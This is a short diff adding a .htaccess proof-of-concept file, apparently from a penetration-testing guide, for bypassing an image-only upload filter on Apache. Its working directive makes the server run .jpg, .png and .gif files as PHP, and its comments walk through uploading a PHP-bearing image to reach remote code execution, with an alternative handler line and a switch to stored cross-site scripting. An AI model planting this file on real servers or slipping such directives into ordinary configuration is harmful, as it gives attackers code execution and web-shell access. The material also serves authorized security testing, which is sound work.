@@ -1,0 +1,10 @@
+# .htaccess PoC (guide §10) — rename to ".htaccess" and upload into the upload directory.
+# Authorized testing only. This makes the server execute image-extension files as PHP, turning a
+# strict image allowlist into RCE. After uploading this, upload webshell_marker.jpg (PHP inside)
+# and request it -> it prints the RCE marker. DELETE both files after the PoC.
+
+AddType application/x-httpd-php .jpg .png .gif
+# Alternative handler form (try if AddType doesn't take):
+# AddHandler application/x-httpd-php .jpg
+# To instead make uploads render as HTML (stored XSS), uncomment:
+# ForceType text/html
